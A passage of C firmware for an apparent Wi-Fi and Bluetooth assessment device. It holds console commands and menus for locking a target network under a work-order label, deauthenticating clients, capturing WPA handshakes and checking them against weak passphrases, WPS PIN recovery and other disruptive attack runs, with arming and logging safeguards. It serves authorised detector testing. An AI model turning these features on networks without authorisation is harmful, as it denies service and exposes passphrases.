    /* Hold the run open for its grace window, draining the UART throughout.
     * Returning immediately would close the command before a detector that
     * alarms two seconds late could be heard. */
    uint32_t grace_end = now_ms() + BAS_GRACE_DEFAULT_MS;
    while (now_ms() < grace_end) {
        poll_uart_alarms();
        vTaskDelay(pdMS_TO_TICKS(20));
    }

    char vline[96];
    bas_run_line(&s_card.r[idx], now_ms(), vline, sizeof(vline));
    bas_console_reply("%s", vline);
    bas_sdlog_verdict(&s_engage, &s_card.r[idx], now_ms());
    s_scoring_run = -1;
}

static void console_exec(const bas_cmd_t *c)
{
    switch (c->kind) {
    case CMD_HELP:   console_help();   break;
    case CMD_STATUS: console_status(); break;
    case CMD_LIST:   console_list();   break;
    case CMD_FAMS:   console_fams();   break;
    case CMD_CARD:   console_card();   break;
    case CMD_WPS:    console_wps();    break;
    case CMD_CRACK:  console_crack(c);  break;
    case CMD_ABORT:  s_abort = true; bas_console_reply("abort set"); break;
    case CMD_RUN:    console_run(c);   break;

    case CMD_SCAN:
        bas_console_reply("surveying...");
        survey();
        bas_console_reply("%u networks", (unsigned)s_scan.count);
        break;

    case CMD_LOCK: {
        int idx = c->index;
        if (idx < 0) {
            idx = bas_scan_find_ssid(&s_scan, c->ssid);
            if (idx < 0) {
                bas_console_reply("no network named '%s' — 'list'", c->ssid);
                break;
            }
        }
        if (idx >= (int)s_scan.count) {
            bas_console_reply("no such network — 'list'");
            break;
        }
        bas_err_t rc = bas_engage_lock(&s_engage, &s_scan.ap[idx], c->text,
                                       "console", now_ms(), BAS_TTL_DEFAULT_MS);
        if (rc != BAS_OK) {
            bas_console_reply("refused: %s", bas_err_str(rc));
        } else {
            bas_console_reply("locked %s label='%s' ttl=%us",
                              s_engage.target.hidden ? "(hidden)"
                                                     : s_engage.target.ssid,
                              s_engage.label,
                              (unsigned)(BAS_TTL_DEFAULT_MS / 1000u));
        }
        break;
    }

    case CMD_UNLOCK:
        bas_engage_clear(&s_engage);
        bas_console_reply("unlocked");
        break;

    case CMD_ALARM:
        if (s_last_run < 0) {
            bas_console_reply("no scorable run");
            break;
        } else {
            bas_err_t rc = bas_card_alarm(&s_card, s_last_run, c->text, 0, 0,
                                          BAS_SRC_NETWORK, now_ms());
            char line[96];
            bas_run_line(&s_card.r[s_last_run], now_ms(), line, sizeof(line));
            bas_console_reply("%s — %s", bas_err_str(rc), line);
        }
        break;

    case CMD_CELL: {
        bas_err_t rc = bas_engage_set_whole_cell(&s_engage, c->index != 0);
        if (rc != BAS_OK) {
            bas_console_reply("refused: %s", bas_err_str(rc));
        } else if (c->index) {
            bas_console_reply("whole cell: every client on %s",
                              s_engage.target.hidden ? "(hidden)"
                                                     : s_engage.target.ssid);
            bas_console_reply("  scoped by BSSID — no other network is touched");
        } else {
            bas_console_reply("whole cell off — %u client(s) selected",
                              (unsigned)s_engage.client_n);
        }
        break;
    }

    case CMD_REGION: {
        static const char *const names[] = { "FCC", "ETSI", "JP" };
        if (c->index == -2) {                    /* auto */
            bas_region_t r;
            char cc[3] = { 0 };
            int total = 0;
            int v = infer_region(&r, cc, sizeof(cc), &total);
            if (v > 0) {
                bas_region_set(r);
                bas_console_reply("inferred %s from '%s' — %d of %d networks",
                                  names[r], cc, v, total);
            } else if (total > 0) {
                bas_console_reply("evidence split across %d networks —", total);
                bas_console_reply("  staying narrow (FCC)");
                bas_region_set(BAS_REGION_FCC);
            } else {
                bas_console_reply("no network advertised a country —");
                bas_console_reply("  staying narrow (FCC)");
                bas_region_set(BAS_REGION_FCC);
            }
        } else if (c->index >= 0) {
            bas_region_set((bas_region_t)c->index);
        }
        bas_region_t r = bas_region_get();
        bas_console_reply("region %s — channels 1..%u",
                          names[r], (unsigned)bas_region_max_channel());
        if (c->index == -1) {
            bas_console_reply("  'region auto|fcc|etsi|jp' to change it");
        }
        /* The clamp is about where the OPERATOR is, not where the target is.
         * A neighbouring network on channel 13 is not permission to transmit
         * there, and the device says so rather than inferring a jurisdiction
         * from the air. */
        bas_console_reply("  set this to where YOU are, not to reach a target");
        break;
    }

    case CMD_PSK: {
        /* Passphrase strength: capture a handshake, test it here, report the
         * finding, and wipe. Nothing crackable outlives the audit. */
        if (!s_engage.locked || !s_engage.has_target) {
            bas_console_reply("lock a network first");
            break;
        }
        if (s_engage.target.hidden || s_engage.target.ssid[0] == '\0') {
            /* The SSID salts the key derivation. Without it there is nothing
             * to test against. */
            bas_console_reply("target is hidden — the SSID salts the key");
            break;
        }

        /* A handshake needs a client to reconnect, and a client reconnects
         * when it feels like it. Continuous is the honest default for a
         * capture that is waiting on someone else's behaviour. */
        int secs = (c->secs > 0) ? c->secs : ((c->secs < 0) ? 0 : 30);
        if (secs > 120) { secs = 120; }

        bool started_rx = !bas_sniff_active();
        if (started_rx) { bas_sniff_start(s_engage.target.channel); }
        else            { bas_sniff_channel(s_engage.target.channel); }

        bas_sniff_handshake_arm(s_engage.target.bssid, s_engage.target.ssid);
        bas_console_reply("listening for a handshake on %s for %ds",
                          s_engage.target.ssid, secs);

        /* A handshake only happens when a client associates. CONFIRM permits a
         * short deauth to prompt one, because forcing a reconnect denies
         * service and is not something to do implicitly. */
        if (c->confirm) {
            /* The nudge has to name a station. A deauth with no client is
             * addressed to the access point itself and disconnects nobody --
             * so it produces no reconnect and no handshake, which looks
             * exactly like a capture that failed for some deeper reason. */
            if (s_engage.client_n == 0u) {
                bas_console_reply("looking for a client to nudge (10s)...");
                /* Ten seconds: a quiet network may go several
                 * seconds between data frames. */
                for (int i = 0; i < 100; i++) {
                    bas_stalist_t cl;
                    if (bas_sniff_clients_of(s_engage.target.bssid, &cl) > 0) {
                        bas_engage_set_client(&s_engage, cl.s[0].mac);
                        char mac[18];
                        bas_mac_fmt(cl.s[0].mac, mac, sizeof(mac));
                        bas_console_reply("  narrowed to %s (%d dBm)", mac,
                                          (int)cl.s[0].rssi);
                        break;
                    }
                    vTaskDelay(pdMS_TO_TICKS(100));
                }
            }
            if (s_engage.client_n == 0u) {
                /* Nothing seen talking to this AP yet. Skip the nudge rather
                 * than abort: a client may associate on its own inside the
                 * listening window, and a handshake captured passively is the
                 * same handshake -- and quieter. */
                bas_console_reply("no client seen yet; listening passively");
                bas_console_reply("  (a natural reconnect still counts)");
            }
            bas_plan_t d;
            bas_plan_default(&d, BAS_FAM_DEAUTH);
            d.seconds = 3;
            d.pps = 10;
            if (s_engage.client_n == 0u) { goto psk_wait; }
            bas_console_reply("nudging that client to reconnect");
            if (bas_plan_validate(&d, BAS_ROLE_ADMIN, &s_engage,
                                  now_ms()) == BAS_OK) {
                bas_tx_result_t dr;
                bas_tx_run(&d, &s_engage, BAS_ROLE_ADMIN, NULL, NULL, &dr);
                bas_sdlog_run(&s_engage, BAS_FAM_DEAUTH, &d, &dr,
                              "PSK audit nudge");
                bas_console_reply("  %u frames sent", (unsigned)dr.frames_sent);
            }
        } else {
            bas_console_reply("(append CONFIRM to nudge clients with a deauth)");
        }

    psk_wait:;
        uint32_t deadline = now_ms() + (uint32_t)secs * 1000u;
        while (now_ms() < deadline &&
               !bas_wpa_complete(bas_sniff_handshake())) {
            vTaskDelay(pdMS_TO_TICKS(100));
        }

        const bas_handshake_t *hs = bas_sniff_handshake();
        if (!bas_wpa_complete(hs)) {
            /* Say which half arrived and what that means. "No handshake" alone
             * sends the operator to debug the capture when the informative
             * answer is usually about the target. */
            const bas_fcount_t *fc = bas_sniff_frames();
            bas_console_reply("no complete handshake (m1=%d m2=%d)",
                              (int)hs->have_m1, (int)hs->have_m2);
            bas_console_reply("  aftermath: auth=%u assoc=%u seen on channel",
                              (unsigned)fc->frames[BAS_FT_AUTH],
                              (unsigned)fc->frames[BAS_FT_ASSOC]);

            if (hs->have_m1 && !hs->have_m2) {
                bas_console_reply("FINDING: the AP started a handshake but the");
                bas_console_reply("  reply was missed — try a longer window");
            } else if (fc->frames[BAS_FT_AUTH] == 0u &&
                       fc->frames[BAS_FT_ASSOC] == 0u) {
                /* Nothing reassociated. On a network advertising WPA3 that is
                 * management-frame protection working as designed, which is a
                 * result about the target rather than a failure of the tool. */
                bas_console_reply("FINDING: nothing reconnected. The client");
                bas_console_reply("  ignored the deauth — likely protected");
                bas_console_reply("  management frames, or it roamed to 5 GHz");
                bas_console_reply("  which this radio cannot follow.");
            } else {
                bas_console_reply("FINDING: clients reconnected but the");
                bas_console_reply("  handshake was not captured — it may have");
                bas_console_reply("  completed off this channel.");
            }
            bas_sniff_handshake_wipe();
            if (started_rx) { bas_sniff_stop(); }
            break;
        }

        bas_console_reply("handshake captured — auditing %u candidates",
                          (unsigned)bas_psk_candidate_count());

        bas_psk_result_t res;
        memset(&res, 0, sizeof(res));
        uint32_t t0 = now_ms();
        uint32_t n = bas_psk_candidate_count();
        for (uint32_t i = 0; i < n; i++) {
            const char *cand = bas_psk_candidate(i);
            res.tried++;
            if (bas_wpa_check(hs, cand)) {
                res.verdict = BAS_PSK_WEAK;
                strncpy(res.found, cand, sizeof(res.found) - 1u);
                break;
            }
            /* The derivation is deliberately slow; yield so the device stays
             * responsive and the watchdog stays quiet. */
            vTaskDelay(1);
        }
        if (res.verdict != BAS_PSK_WEAK) {
            res.verdict = BAS_PSK_SURVIVED;
        }
        res.elapsed_ms = now_ms() - t0;

        if (res.verdict == BAS_PSK_WEAK) {
            bas_console_reply("FINDING: WEAK — passphrase is '%s'", res.found);
            bas_console_reply("  found after %u candidates in %ums",
                              (unsigned)res.tried, (unsigned)res.elapsed_ms);
        } else {
            /* Precise about what was actually shown. Exhausting a small list
             * proves the passphrase is not an obvious one, and says nothing
             * whatever about whether it is strong. */
            bas_console_reply("FINDING: not among %u weak candidates (%ums)",
                              (unsigned)res.tried, (unsigned)res.elapsed_ms);
            bas_console_reply("  this does NOT mean the passphrase is strong");
        }

        {
            char note[64];
            snprintf(note, sizeof(note), "PSK %s after %u",
                     bas_psk_verdict_name(res.verdict), (unsigned)res.tried);
            bas_plan_t dummy;
            bas_plan_default(&dummy, BAS_FAM_PMKID);
            bas_tx_result_t nores;
            memset(&nores, 0, sizeof(nores));
            /* The verdict goes in the log. The handshake never does. */
            bas_sdlog_run(&s_engage, BAS_FAM_PMKID, &dummy, &nores, note);
        }

        bas_sniff_handshake_wipe();
        memset(&res, 0, sizeof(res));
        if (started_rx) { bas_sniff_stop(); }
        bas_console_reply("handshake wiped");
        break;
    }

    case CMD_BLESCAN:
        if (c->index < 0) {
            bas_ble_scan_stop();
            bas_console_reply("ble scan stopped");
        } else if (bas_ble_scan_start() == ESP_OK) {
            bas_console_reply("scanning BLE, passive");
        } else {
            bas_console_reply("BLE unavailable");
            break;
        }
        {
            int n = 0;
            const bas_ble_dev_t *d = bas_ble_devices(&n);
            bas_console_reply("%d devices seen", n);
            int trackers = 0;
            for (int i = 0; i < n && i < 14; i++) {
                char mac[18];
                bas_mac_fmt(d[i].addr, mac, sizeof(mac));
                bas_console_reply("  %s %4d %-16s %-14s x%u%s", mac,
                                  (int)d[i].rssi, bas_ble_kind_name(d[i].kind),
                                  d[i].name[0] ? d[i].name : "-",
                                  (unsigned)d[i].count,
                                  d[i].randomised ? " rand" : "");
            }
            for (int i = 0; i < n; i++) {
                if (bas_ble_kind_is_tracker(d[i].kind)) { trackers++; }
            }
            if (trackers > 0) {
                bas_console_reply("FINDING: %d tracker%s in range, longest dwell %u ms",
                                  trackers, trackers == 1 ? "" : "s",
                                  (unsigned)bas_ble_longest_tracker_dwell(now_ms()));
            }
        }
        break;

    case CMD_UART:
        if (c->index < 0) {
            bas_uart_alarm_stop();
            bas_console_reply("alarm listener stopped");
        } else if (bas_uart_alarm_start(c->index) == ESP_OK) {
            bas_console_reply("listening for BASANOS-ALARM on GPIO %d at %d baud",
                              (int)BOARD_UART_RX,
                              c->index ? c->index : BAS_UART_ALARM_BAUD);
            bas_console_reply("loopback self-test: %s",
                              bas_uart_alarm_selftest() ? "PASSED — the whole"
                                  " path works, waiting on a real detector"
                                  : "FAILED");
        } else {
            bas_console_reply("could not open the UART");
        }
        break;

    case CMD_BG:
        s_bg_scan = (c->index != 0);
        if (!s_bg_scan) { bas_sniff_stop(); }
        bas_console_reply("background discovery %s",
                          s_bg_scan ? "on — receive only, hops the band"
                                    : "off");
        break;

    case CMD_SNIFF:
        if (c->index < 0) {
            bas_sniff_stop();
            bas_console_reply("receiver stopped");
        } else {
            bas_sniff_start((uint8_t)c->index);
            bas_console_reply("listening, %s",
                              c->index == 0 ? "hopping" : "camped");
        }
        break;

    case CMD_RECON: {
        const bas_fcount_t     *f  = bas_sniff_frames();
        const bas_chansurvey_t *ch = bas_sniff_channels();
        const bas_stalist_t    *sl = bas_sniff_stations();
        int pn = 0;
        const bas_probe_t *pl = bas_sniff_probes(&pn);

        bas_console_reply("receiver=%d raw=%u ch=%u frames=%u rate=%u.%02u/s",
                          (int)bas_sniff_active(), (unsigned)bas_sniff_raw(),
                          (unsigned)bas_sniff_current_channel(),
                          (unsigned)f->total,
                          (unsigned)(bas_fcount_rate_x100(f) / 100u),
                          (unsigned)(bas_fcount_rate_x100(f) % 100u));
        bas_console_reply("beacon=%u probe=%u deauth=%u disassoc=%u data=%u",
                          (unsigned)f->frames[BAS_FT_BEACON],
                          (unsigned)f->frames[BAS_FT_PROBE_REQ],
                          (unsigned)f->frames[BAS_FT_DEAUTH],
                          (unsigned)f->frames[BAS_FT_DISASSOC],
                          (unsigned)f->frames[BAS_FT_DATA]);

        uint8_t q = bas_chan_quietest(ch, 400);
        if (q != 0u) {
            bas_console_reply("quietest measured channel: %u", (unsigned)q);
        } else {
            bas_console_reply("no channel dwelt on long enough to judge");
        }

        bas_console_reply("clients: %u", (unsigned)sl->count);
        for (uint8_t i = 0; i < sl->count && i < 8u; i++) {
            char mac[18], bss[18];
            bas_mac_fmt(sl->s[i].mac, mac, sizeof(mac));
            bas_mac_fmt(sl->s[i].bssid, bss, sizeof(bss));
            bas_console_reply("  %s on %s %4d dBm x%u%s", mac, bss,
                              (int)sl->s[i].rssi, (unsigned)sl->s[i].frames,
                              sl->s[i].randomised ? " randomised" : "");
        }

        bas_console_reply("probed names: %d", pn);
        for (int i = 0; i < pn && i < 8; i++) {
            char mac[18];
            bas_mac_fmt(pl[i].src, mac, sizeof(mac));
            bas_console_reply("  \"%s\" from %s x%u", pl[i].ssid, mac,
                              (unsigned)pl[i].count);
        }
        break;
    }

    case CMD_SELFTEST: {
        bas_selftest_t st;
        bas_selftest_run(&st);
        bas_console_reply("selftest %d checks, %d failures", st.checks,
                          st.failures);
        break;
    }

    default:
        bas_console_reply("unhandled");
        break;
    }
}

/* --- navigation ------------------------------------------------------------ */

typedef enum {
    ST_HOME, ST_WIFI, ST_NETWORKS, ST_TARGET, ST_LABEL,
    ST_ATTACKS, ST_ATTACK, ST_HOLD, ST_ASK, ST_RESULTS,
    ST_BLE, ST_BLE_DEV, ST_RECON, ST_CHANNELS, ST_FRAMES, ST_CLIENTS,
    ST_PROBES, ST_WPS, ST_WPS_RUN,
} state_t;

static uint16_t class_stripe(bas_class_t k)
{
    return k == BAS_CLASS_DISRUPTIVE ? TH_STOP
         : k == BAS_CLASS_ACTIVE     ? TH_WARN
                                     : TH_OK;
}

/* Build the attack list for a section. Unavailable families stay visible with
 * the reason, because a missing capability should look like a gap and not like
 * something nobody thought of. */
static int build_attacks(const bas_family_t *fams, int n,
                         bas_row_t *rows, char subs[][40])
{
    for (int i = 0; i < n; i++) {
        const bas_family_spec_t *f = bas_family(fams[i]);
        bool ok = bas_tx_supported(fams[i]);
        snprintf(subs[i], 40, "%s", ok ? f->detector
                                       : bas_tx_pending_reason(fams[i]));
        rows[i].title   = f->name;
        rows[i].sub     = subs[i];
        rows[i].stripe  = class_stripe(f->klass);
        rows[i].enabled = ok;
    }
    return n;
}

void app_main(void)
{
    /* FIRST. On battery the PWR button only supplies power while it is held;
     * this latch keeps the rail up after it is released. Everything else can
     * wait, and must, because anything that blocks or fails would switch the
     * board off mid-boot. USB hides this entirely. */
    bas_power_latch();

    ESP_LOGI(TAG, "Basanos v%d.%d.%d", BAS_VERSION_MAJOR, BAS_VERSION_MINOR,
             BAS_VERSION_PATCH);

    ESP_ERROR_CHECK(bas_display_init());
    bas_display_backlight(85);

    bas_ui_splash();
    vTaskDelay(pdMS_TO_TICKS(1400));

    bas_selftest_t st;
    bas_selftest_run(&st);
    /* Selftest is the deepest the main task ever goes -- it holds several
     * scan entries and engagements across merged frames. Logging the low
     * water mark here is what turns "it reboots on the bench" into a number:
     * growing bas_ap_t once took this straight through an 8 KB stack. */
    ESP_LOGI(TAG, "main stack low water: %u bytes free",
             (unsigned)uxTaskGetStackHighWaterMark(NULL));
    bas_ui_selftest(&st);
    vTaskDelay(pdMS_TO_TICKS(2000));
    if (!bas_selftest_ok(&st)) {
        ESP_LOGE(TAG, "self-test failed — halting");
        while (true) { vTaskDelay(pdMS_TO_TICKS(1000)); }
    }

    buttons_init();
    bas_power_init();
    bas_console_start();
    if (!bas_sdlog_init()) {
        /* A missing card is a capability that is absent, not a failure. The
         * engagement still runs and still scores. */
        ESP_LOGW(TAG, "engagement log unavailable: %s", bas_sdlog_status());
    }
    (void)bas_touch_init();
    ESP_LOGI(TAG, "touch: %s (0x%02X)",
             bas_touch_present() ? "present" : "absent",
             (unsigned)bas_touch_chip_id());

    wifi_init();
    survey();
    bas_card_reset(&s_card);
    bas_engage_clear(&s_engage);

    {
        bas_region_t r;
        char cc[3] = { 0 };
        int total = 0;
        int v = infer_region(&r, cc, sizeof(cc), &total);
        if (v > 0) {
            bas_region_set(r);
            ESP_LOGI(TAG, "region: %s inferred from '%s' (%d of %d networks)",
                     bas_region_name(r), cc, v, total);
        } else {
            ESP_LOGI(TAG, "region: %s (nothing conclusive on air, staying narrow)",
                     bas_region_name(bas_region_get()));
        }
    }

    ESP_LOGI(TAG, "heap: %u internal, %u psram",
             (unsigned)heap_caps_get_free_size(MALLOC_CAP_INTERNAL),
             (unsigned)heap_caps_get_free_size(MALLOC_CAP_SPIRAM));

    state_t  st_cur = ST_HOME;
    int  home_sel = 0, wifi_sel = 0, net_sel = 0, atk_sel = 0;
    int  recon_sel = 0, cli_sel = 0, probe_sel = 0, ble_sel = 0, bdev_sel = 0;
    int  wps_sel = 0;
    /* Which menu launched a recovery, so dismissing it returns there. */
    bool wps_from_wifi = false;
    /* Whichever section's list is open. The detail, hold and run screens are
     * identical for Wi-Fi and BLE, so they follow this rather than each
     * knowing which section they came from. */
    const bas_family_t *cur_fams = WIFI_FAMS;
    int cur_fam_n = WIFI_FAM_N;
    bas_stalist_t clients;
    bas_sta_reset(&clients);
    char label[BAS_LABEL_MAX] = {0};
    /* Whether the label being typed authorises a network or an area. */
    bool label_is_area = false;
    uint32_t hold_start = 0, ask_until = 0, run_frames = 0, bg_merged = 0;
    int      hold_gap = 0;   /* consecutive not-held samples */
    int  run_idx = -1;
    bas_plan_t plan;
    uint8_t role = BAS_ROLE_OPERATOR;
    bool redraw = true;

    static bas_row_t rows[16];
    static char subs[16][40];

    while (true) {
        /* Idle discovery. Suspended during a run, and never while an active
         * scan owns the radio. */
        if (s_bg_scan && !bas_sniff_active() && st_cur != ST_CHANNELS) {
            bas_sniff_start(0);
        }
        if (s_bg_scan && bas_sniff_active() && st_cur != ST_CHANNELS) {
            bas_sniff_hop(900);
            if ((now_ms() - bg_merged) > 2500u) {
                bg_merged = now_ms();
                if (bas_sniff_merge_networks(&s_scan) > 0) {
                    redraw = true;   /* the counts on screen moved */
                }
            }
        }

        bas_cmd_t cmd;
        while (bas_console_take(&cmd)) {
            console_exec(&cmd);
            redraw = true;
        }

        uint16_t tx = 0, ty = 0;
        bool tap = ui_tap(&tx, &ty);
        input_ev_t ev = input_poll();

        if (ev == EV_POWEROFF) {
            bas_ui_note("POWERING OFF", NULL, NULL, TH_INK3);
            vTaskDelay(pdMS_TO_TICKS(600));
            bas_display_backlight(0);
            bas_power_off();
            vTaskDelay(pdMS_TO_TICKS(400));
            /* On USB the cable holds the rail up, so dropping the latch does
             * nothing visible. Say so rather than appearing to hang. */
            bas_display_backlight(85);
            bas_ui_note("STILL ON USB", "Unplug to switch off.", NULL, TH_WARN);
            vTaskDelay(pdMS_TO_TICKS(2000));
            bas_power_latch();
            redraw = true;
            continue;
        }

        bool accept = (ev == EV_ACCEPT);
        bool back   = (ev == EV_BACK);
        bool next   = (ev == EV_NEXT);

        switch (st_cur) {

        case ST_HOME: {
            if (redraw) {
                bas_ui_home(&s_engage, &s_scan, &s_card, home_sel);
                redraw = false;
            }
            if (next) { home_sel = (home_sel + 1) % BAS_HOME__COUNT; redraw = true; }
            int hit = tap ? bas_ui_home_hit(tx, ty) : -1;
            if (hit >= 0) {
                if (hit == home_sel) { accept = true; }
                else { home_sel = hit; redraw = true; }
            }
            if (accept) {
                switch (home_sel) {
                case BAS_HOME_WIFI:    st_cur = ST_WIFI;    wifi_sel = 0; break;
                case BAS_HOME_BLE:     st_cur = ST_BLE;                  break;
                case BAS_HOME_RECON:   st_cur = ST_RECON;                 break;
                case BAS_HOME_RESULTS: st_cur = ST_RESULTS;               break;
                default: break;
                }
                redraw = true;
            }
            break;
        }

        case ST_WIFI: {
            bool locked = s_engage.locked;
            rows[0] = (bas_row_t){ "Scan networks", "passive survey of 1-13", 0, true };
            rows[1] = (bas_row_t){ "Choose target", "pick one network", 0, s_scan.count > 0 };
            rows[2] = (bas_row_t){ "Attacks", locked ? "signal families"
                                                     : "lock a target first",
                                   0, locked };
            /* Recovery lives here as well as under Recon. The survey is
             * reconnaissance and belongs there; taking the PIN and the key is
             * an attack, and this is where an operator looks for one. */
            rows[3] = (bas_row_t){ "WPS PIN recovery",
                                   locked ? (s_engage.target.wps.present
                                                ? "Pixie Dust, then defaults"
                                                : "target announces no WPS")
                                          : "lock a target first",
                                   locked ? TH_STOP : 0, locked };
            rows[4] = (bas_row_t){ "Release target", locked ? s_engage.label
                                                            : "nothing locked",
                                   0, locked };
            if (redraw) {
                bas_ui_list("Wi-Fi", NULL, rows, 5, wifi_sel,
                            "LEFT open   hold LEFT back");
                redraw = false;
            }
            if (next) { wifi_sel = (wifi_sel + 1) % 5; redraw = true; }
            if (back) { st_cur = ST_HOME; redraw = true; break; }
            int hit = tap ? bas_ui_list_hit(tx, ty, wifi_sel, 5) : -1;
            if (hit >= 0) {
                if (hit == wifi_sel) { accept = true; }
                else { wifi_sel = hit; redraw = true; }
            }
            if (accept && rows[wifi_sel].enabled) {
                switch (wifi_sel) {
                case 0: survey(); break;
                case 1: st_cur = ST_NETWORKS; net_sel = 0; break;
                case 2:
                    cur_fams = WIFI_FAMS; cur_fam_n = WIFI_FAM_N;
                    st_cur = ST_ATTACKS; atk_sel = 0;
                    break;
                case 3: wps_from_wifi = true; st_cur = ST_WPS_RUN; break;
                case 4: bas_engage_clear(&s_engage); break;
                default: break;
                }
                redraw = true;
            }
            break;
        }

        case ST_NETWORKS:
            if (redraw) { bas_ui_networks(&s_scan, net_sel); redraw = false; }
            if (back) { st_cur = ST_WIFI; redraw = true; break; }
            if (next && s_scan.count) {
                net_sel = (net_sel + 1) % (int)s_scan.count;
                redraw = true;
            }
            {
                int hit = tap ? bas_ui_list_hit(tx, ty, net_sel, s_scan.count) : -1;
                if (hit >= 0) {
                    if (hit == net_sel) { accept = true; }
                    else { net_sel = hit; redraw = true; }
                }
            }
            if (accept && s_scan.count) { st_cur = ST_TARGET; redraw = true; }
            break;

        case ST_TARGET:
            if (redraw) { bas_ui_target(&s_scan.ap[net_sel], -1); redraw = false; }
            if (back) { st_cur = ST_NETWORKS; redraw = true; }
            if (tap || accept) {
                label[0] = '\0';
                label_is_area = false;
                st_cur = ST_LABEL;
                redraw = true;
            }
            break;

        case ST_LABEL: {
            if (redraw) {
                bas_ui_keyboard("Work order, client or ticket", label);
                redraw = false;
            }
            if (back) {
                st_cur = label_is_area ? ST_BLE : ST_TARGET;
                redraw = true;
                break;
            }
            if (!tap) { break; }

            int k = bas_ui_keyboard_hit(tx, ty);
            size_t n = strlen(label);
            if (k >= 0) {
                if (n + 1u < sizeof(label)) {
                    label[n] = bas_ui_keyboard_char(k);
                    label[n + 1] = '\0';
                }
                redraw = true;
            } else if (k == -3) {
                if (n > 0u) { label[n - 1] = '\0'; }
                redraw = true;
            } else if (k == -2) {
                bas_err_t rc;
                if (label_is_area) {
                    rc = bas_engage_lock_area(&s_engage, label, "operator",
                                              now_ms(), BAS_TTL_DEFAULT_MS);
                } else {
                    rc = bas_engage_lock(&s_engage, &s_scan.ap[net_sel], label,
                                         "operator", now_ms(),
                                         BAS_TTL_DEFAULT_MS);
                }
                if (rc == BAS_OK) {
                    ESP_LOGI(TAG, "locked '%s' %s", label,
                             label_is_area ? "(area, no network)"
                                           : s_engage.target.ssid);
                    if (label_is_area) {
                        cur_fams = BLE_FAMS;
                        cur_fam_n = BLE_FAM_N;
                    }
                    st_cur = ST_ATTACKS;
                    atk_sel = 0;
                } else {
                    bas_ui_note("REFUSED", bas_err_str(rc), NULL, TH_STOP);
                    vTaskDelay(pdMS_TO_TICKS(1800));
                }
                redraw = true;
            }
            break;
        }

        case ST_ATTACKS: {
            int n = build_attacks(cur_fams, cur_fam_n, rows, subs);
            if (redraw) {
                bas_ui_list(cur_fams == WIFI_FAMS ? "Wi-Fi attacks" : "Bluetooth",
                            s_engage.target.hidden ? "(hidden)"
                                                   : s_engage.target.ssid,
                            rows, n, atk_sel, "LEFT open   hold LEFT back");
                redraw = false;
            }
            if (back) {
                st_cur = (cur_fams == WIFI_FAMS) ? ST_WIFI : ST_BLE;
                redraw = true;
                break;
            }
            if (next) { atk_sel = (atk_sel + 1) % n; redraw = true; }
            int hit = tap ? bas_ui_list_hit(tx, ty, atk_sel, n) : -1;
            if (hit >= 0) {
                if (hit == atk_sel) { accept = true; }
                else { atk_sel = hit; redraw = true; }
            }
            if (accept) {
                bas_plan_default(&plan, cur_fams[atk_sel]);
                st_cur = ST_ATTACK;
                redraw = true;
            }
            break;
        }

        case ST_ATTACK: {
            bas_family_t f = cur_fams[atk_sel];
            const bas_family_spec_t *fs = bas_family(f);
            bas_plan_t probe = plan;
            bas_err_t gate = bas_plan_validate(&probe, BAS_ROLE_ADMIN,
                                               &s_engage, now_ms());
            if (redraw) {
                bas_ui_attack(f, &probe, &s_engage, gate);
                redraw = false;
            }
            bool ready = (gate == BAS_OK) && bas_tx_supported(f);

            /* RIGHT cycles the duration, ending in "until stopped". A long
             * soak is a real assessment need -- does the detector still alarm
             * on minute nine -- and re-arming every thirty seconds to get it
             * would be worse than letting the run continue under a lock that
             * is re-checked every frame. */
            if (next && ready) {
                uint16_t opts[4] = { 5u, 15u, fs->max_seconds, 0u };
                int at = 3;
                for (int i = 0; i < 4; i++) {
                    if (plan.seconds == opts[i]) { at = i; break; }
                }
                plan.seconds = opts[(at + 1) % 4];
                redraw = true;
                break;
            }

            /* A disruptive family arms on the PRESS, not on the release.
             *
             * The footer asks for a hold, so the operator holds -- and a hold
             * on this screen used to reach 600 ms and fire BACK, throwing them
             * out to the list before the arming screen ever appeared. Touch hid
             * the bug completely, because a tap registers on finger-down and so
             * arrived at the hold screen immediately.
             *
             * Entering on the press makes press-and-hold one continuous
             * gesture across both screens, which is what the footer describes.
             * BACK cannot fire here because the transition happens well inside
             * its 600 ms threshold. */
            if (ready && fs->klass == BAS_CLASS_DISRUPTIVE && input_held_down()) {
                plan = probe;
                hold_start = 0;
                hold_gap   = 0;
                st_cur = ST_HOLD;
                redraw = true;
                break;
            }

            if (back) { st_cur = ST_ATTACKS; redraw = true; break; }

            if ((tap || accept) && ready) {
                plan = probe;
                role = BAS_ROLE_OPERATOR;
                goto do_run;
            }
            break;
        }

        case ST_HOLD: {
            const uint32_t HOLD_MS = 1500u;
            uint32_t t = now_ms();
            /* A mechanical contact bounces, and GPIO 0 doubles as the BOOT
             * strapping pin, so a single not-held sample mid-hold is noise
             * rather than intent. Cancelling on the first one made arming work
             * roughly every other attempt. A real release lasts far longer
             * than three polls. */
            const int RELEASE_SAMPLES = 3;

            if (input_held_down()) {
                hold_gap = 0;
                if (hold_start == 0u) { hold_start = t; }
                uint32_t h = t - hold_start;
                bas_ui_hold(cur_fams[atk_sel], &s_engage,
                            (int)(h * 100u / HOLD_MS));
                if (h >= HOLD_MS) {
                    hold_gap = 0;
                    role = BAS_ROLE_ADMIN;   /* lasts exactly one run */
                    goto do_run;
                }
            } else if (hold_start != 0u) {
                if (++hold_gap >= RELEASE_SAMPLES) {
                    hold_start = 0;
                    hold_gap   = 0;
                    st_cur = ST_ATTACK;
                    redraw = true;
                } else {
                    /* Hold the bar where it was rather than dropping it: a bar
                     * that flickers to zero and recovers looks like the gesture
                     * failed even when it did not. */
                    uint32_t h = t - hold_start;
                    bas_ui_hold(cur_fams[atk_sel], &s_engage,
                                (int)(h * 100u / HOLD_MS));
                }
            } else {
                hold_gap = 0;
                bas_ui_hold(cur_fams[atk_sel], &s_engage, 0);
            }
            /* EV_BACK is deliberately ignored here. It fires from a 600 ms
             * press of the same button the arming hold uses, so honouring it
             * would eject the operator at 40% every single time -- the bar
             * filling and resetting with no way to finish. Releasing cancels,
             * which is the gesture's own natural exit. */
            break;

        do_run: {
                bas_family_t f = cur_fams[atk_sel];
                bool aborted = false;
                /* The operator arrives here still holding whatever completed
                 * the arming gesture. An abort must be a NEW deliberate act,
                 * so nothing counts until that hold has been released --
                 * otherwise the press that armed the run is also the press
                 * that cancels it. */
                bool released = false;
                for (int left = 3; left > 0 && !aborted; left--) {
                    bas_ui_arm(f, &s_engage, left);
                    for (int i = 0; i < 10; i++) {
                        uint16_t ax, ay;
                        bool touching = input_held_down();
                        if (!touching) { released = true; }

                        bool tapped = ui_tap(&ax, &ay);
                        bool pressed = (input_poll() != EV_NONE);
